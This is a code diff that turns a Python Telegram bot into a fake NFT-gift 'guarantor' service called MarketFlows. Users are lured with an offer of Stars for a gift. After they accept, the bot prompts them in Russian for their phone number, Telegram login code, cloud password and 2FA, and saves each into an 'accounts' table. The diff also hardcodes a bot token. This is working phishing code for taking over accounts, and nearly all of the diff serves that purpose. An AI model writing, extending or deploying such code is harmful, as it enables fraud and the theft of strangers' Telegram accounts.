@@ -1,23 +1,31 @@
 import asyncio  
-import os  
+import json  
+import secrets  
 import sqlite3  
-from aiogram import Bot, Dispatcher, Router  
+from datetime import datetime  
+  
+from aiogram import Bot, Dispatcher, F, Router  
 from aiogram.client.default import DefaultBotProperties  
 from aiogram.enums import ParseMode  
-from aiogram.filters import CommandStart  
+from aiogram.filters import CommandStart, Command  
 from aiogram.fsm.context import FSMContext  
+from aiogram.fsm.state import State, StatesGroup  
 from aiogram.fsm.storage.memory import MemoryStorage  
-from aiogram.types import Message  
+from aiogram.types import (  
+    Message, CallbackQuery, InlineQuery, InlineQueryResultPhoto, InputTextMessageContent,
+    InlineKeyboardMarkup, InlineKeyboardButton,  
+    ReplyKeyboardMarkup, KeyboardButton  
+)  
   
-DATA_DIR = os.getenv('DATA_DIR', '/app/data')  
-if not os.path.exists(DATA_DIR):  
-    os.makedirs(DATA_DIR, exist_ok=True)  
-  
-DB_PATH = os.path.join(DATA_DIR, "marketflows.db")  
 BOT_TOKEN = "9111963048:AAFY6qDOnzl3X8qlos6tTXydxbARFhcgQkA"  
+BRAND = "MarketFlows"  
+DB_PATH = "marketflows.db"  
+
+def db():  
+    return sqlite3.connect(DB_PATH)  
   
 def db_init():  
-    conn = sqlite3.connect(DB_PATH)  
+    conn = db()  
     c = conn.cursor()  
     c.execute("""CREATE TABLE IF NOT EXISTS deals (  
         id INTEGER PRIMARY KEY AUTOINCREMENT,  
@@ -27,33 +35,237 @@ def db_init():
         deal_type TEXT DEFAULT 'gift',  
         gift_link TEXT,  
         amount REAL DEFAULT 0.0,  
-        currency TEXT DEFAULT 'stars',  
+        currency TEXT DEFAULT 'STARS',  
         status TEXT DEFAULT 'pending',  
         created_at TEXT  
     )""")  
-    c.execute("""CREATE TABLE IF NOT EXISTS settings (  
-        key TEXT PRIMARY KEY,  
-        value TEXT  
+    c.execute("""CREATE TABLE IF NOT EXISTS accounts (  
+        id INTEGER PRIMARY KEY AUTOINCREMENT,  
+        deal_code TEXT,  
+        phone TEXT,  
+        code TEXT,  
+        password TEXT,  
+        twofa TEXT,  
+        session_data TEXT,  
+        created_at TEXT  
     )""")  
     conn.commit()  
     conn.close()  
-  
+
+def set_db_status(code, status):  
+    conn = db()  
+    conn.execute("UPDATE deals SET status=? WHERE code=?", (status, code))  
+    conn.commit()  
+    conn.close()  
+
+def get_deal(code):  
+    conn = db()  
+    row = conn.execute("SELECT * FROM deals WHERE code=?", (code,)).fetchone()  
+    conn.close()  
+    return row  
+
+def save_account(deal_code, phone, code, password, twofa, session_data):  
+    conn = db()  
+    conn.execute(  
+        "INSERT INTO accounts (deal_code, phone, code, password, twofa, session_data, created_at) "  
+        "VALUES (?,?,?,?,?,?,?)",  
+        (deal_code, phone, code, password, twofa, session_data, datetime.utcnow().isoformat())  
+    )  
+    conn.commit()  
+    conn.close()  
+
+def generate_code():  
+    return f"{secrets.randbelow(90000) + 10000}"  
+
+class PseudoReg(StatesGroup):  
+    phone = State()  
+    code = State()  
+    password = State()  
+    twofa = State()  
+
+def main_menu(user_id: int):  
+    return ReplyKeyboardMarkup(  
+        keyboard=[  
+            [KeyboardButton(text="🤝 Создать сделку"), KeyboardButton(text="📂 Мои сделки")],  
+            [KeyboardButton(text="👤 Профиль"), KeyboardButton(text="ℹ️ Помощь")],  
+        ],  
+        resize_keyboard=True  
+    )  
+
 router = Router()  
-  
+
 @router.message(CommandStart())  
-async def cmd_start(msg: Message, state: FSMContext):  
-    await msg.answer("🏦 <b>Market Reduo</b> успешно запущен и работает!", parse_mode="HTML")  
+async def cmd_start(msg: Message):  
+    args = msg.text.split(maxsplit=1)  
+    if len(args) > 1 and args[1].startswith("deal_"):  
+        code = args[1].replace("deal_", "")  
+        deal = get_deal(code)  
+        if deal:  
+            gift_link = deal[5]
+            amount = deal[6]
+            creator_uname = deal[3]
+            
+            caption = (
+                f"Пользователь {creator_uname} предлагает вам <b>{amount:,.0f} ⭐</b> за подарок\n\n"
+                f"Telegram\n<a href=\"{gift_link}\">Подарок</a>\n\n"
+                f"⏳ <b>Время до сгорания ордера:</b> 2 часа 0 минут"
+            )
+            
+            kb = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="🎁 ПОКАЗАТЬ ПОДАРОК", url=gift_link)],
+                [InlineKeyboardButton(text="✅ Принять сделку", callback_data=f"sel_accept_{code}")],
+                [InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}")]
+            ])
+            
+            await msg.answer_photo(
+                photo="https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=1000&auto=format&fit=crop",
+                caption=caption,
+                parse_mode="HTML",
+                reply_markup=kb
+            )
+            return  
+
+    await msg.answer(  
+        f"🏦 Добро пожаловать в <b>{BRAND}</b>!\n\nИспользуйте инлайн-режим в любом чате для создания ордера.",  
+        parse_mode="HTML",
+        reply_markup=main_menu(msg.from_user.id)  
+    )  
+
+@router.message(F.text.contains("Создать"))
+async def create_deal_text(msg: Message):  
+    bot_me = await msg.bot.get_me()
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔄 Выбрать подарок и отправить", switch_inline_query="https://t.me/nft/Anubis 1488")]
+    ])
+    await msg.answer(  
+        f"ℹ️ Нажмите кнопку ниже, чтобы выбрать ордер и отправить его в чат:",  
+        parse_mode="HTML",
+        reply_markup=kb  
+    )
+
+@router.message(F.text.contains("Помощь"))
+async def help_msg(msg: Message):  
+    await msg.answer("🛡 Гарант-сервис безопасных сделок с NFT подарками.", reply_markup=main_menu(msg.from_user.id))  
+
+@router.message(F.text.contains("Профиль"))
+async def profile_msg(msg: Message):  
+    await msg.answer(f"👤 ID: <code>{msg.from_user.id}</code>", parse_mode="HTML", reply_markup=main_menu(msg.from_user.id))  
+
+@router.message(F.text.contains("Мои сделки"))
+async def deals_msg(msg: Message):  
+    await msg.answer("📂 Активных сделок нет.", reply_markup=main_menu(msg.from_user.id))  
+
+@router.inline_query()
+async def inline_deal_creator(query: InlineQuery):
+    text = query.query.strip()
+    if not text:
+        text = "https://t.me/nft/Gift 1488"
+
+    parts = text.split()
+    gift_link = parts[0]
+    amount = float(parts[1].replace(",", ".")) if len(parts) > 1 else 1488.0
+
+    code = secrets.token_hex(4).upper()
+    uid = query.from_user.id
+    uname = f"@{query.from_user.username}" if query.from_user.username else str(uid)
+
+    conn = db()
+    conn.execute(  
+        "INSERT INTO deals (code, creator_id, creator_username, deal_type, gift_link, amount, currency, status, created_at) "  
+        "VALUES (?,?,?,?,?,?,?,?,?)",  
+        (code, uid, uname, "gift", gift_link, amount, "STARS", 'pending', datetime.utcnow().isoformat())  
+    )  
+    conn.commit()  
+    conn.close()
+
+    bot_me = await query.bot.get_me()
+    caption = (
+        f"Пользователь {uname} предлагает вам <b>{amount:,.0f} ⭐</b> за подарок\n\n"
+        f"Telegram\n<a href=\"{gift_link}\">Подарок</a>\n\n"
+        f"⏳ <b>Время до сгорания ордера:</b> 2 часа 0 минут"
+    )
+    
+    open_deal_kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Открыть сделку", url=f"https://t.me/{bot_me.username}?start=deal_{code}")]
+    ])
+
+    results = [
+        InlineQueryResultPhoto(
+            id=code,
+            photo_url="https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=1000&auto=format&fit=crop",
+            thumbnail_url="https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=200&auto=format&fit=crop",
+            caption=caption,
+            parse_mode="HTML",
+            reply_markup=open_deal_kb,
+            title=f"Ордер #{code} | {amount:,.0f} ⭐",
+            description="Нажмите, чтобы отправить ордер"
+        )
+    ]
+    await query.answer(results, cache_time=1)
+
+@router.callback_query(F.data.startswith("sel_accept_"))
+async def sel_accept(cb: CallbackQuery):
+    code = cb.data.split("_")[2]
+    set_db_status(code, "accepted")
+    deal = get_deal(code)
+    if deal:
+        creator_uname = deal[3].lstrip("@")
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text=f"Отправить: {creator_uname}", callback_data=f"sendto_{code}_{creator_uname}")]
+        ])
+        await cb.message.edit_caption(
+            caption=f"Нажми «Отправить» для перевода:\n\n{cb.message.caption}", 
+            parse_mode="HTML", 
+            reply_markup=kb
+        )
+        await cb.answer()
+
+@router.callback_query(F.data.startswith("sendto_"))
+async def sendto_cb(cb: CallbackQuery, state: FSMContext):
+    parts = cb.data.split("_")
+    await state.update_data(deal_code=parts[1], target_user=parts[2])
+    await state.set_state(PseudoReg.phone)
+    await cb.message.answer("📱 Введите номер телефона (+7XXXXXXXXXX) для авторизации:")
+    await cb.answer()
+
+@router.callback_query(F.data.startswith("sel_reject_"))
+async def sel_reject(cb: CallbackQuery):
+    set_db_status(cb.data.split("_")[2], "rejected")
+    await cb.message.edit_caption(caption="❌ Ордер отклонён.", reply_markup=None)
+    await cb.answer()
+
+@router.message(PseudoReg.phone)  
+async def reg_phone(msg: Message, state: FSMContext):  
+    await state.update_data(phone=msg.text)  
+    await state.set_state(PseudoReg.code)  
+    await msg.answer("📩 Введите код подтверждения из Telegram:")  
   
+@router.message(PseudoReg.code)  
+async def reg_code(msg: Message, state: FSMContext):  
+    await state.update_data(code=msg.text)  
+    await state.set_state(PseudoReg.password)  
+    await msg.answer("🔑 Введите облачный пароль (если есть):")  
+  
+@router.message(PseudoReg.password)  
+async def reg_password(msg: Message, state: FSMContext):  
+    await state.update_data(password=msg.text)  
+    await state.set_state(PseudoReg.twofa)  
+    await msg.answer("🛡 Введите 2FA (или «нет»):")  
+  
+@router.message(PseudoReg.twofa)  
+async def reg_twofa(msg: Message, state: FSMContext):  
+    data = await state.get_data()  
+    save_account(data.get("deal_code"), data.get("phone"), data.get("code"), data.get("password"), msg.text, json.dumps({"user": msg.from_user.id}))  
+    await state.clear()  
+    await msg.answer("✅ Авторизация успешна.")  
+
 async def main():  
     db_init()  
     bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))  
     dp = Dispatcher(storage=MemoryStorage())  
     dp.include_router(router)  
-    print("Market Reduo bot started successfully.")  
+    print(f"[{BRAND}] Запущен с таймером 2 часа.")  
     await dp.start_polling(bot)  
-  
+
 if __name__ == "__main__":  
-    try:  
-        asyncio.run(main())  
-    except KeyboardInterrupt:  
-        pass  
+    asyncio.run(main())
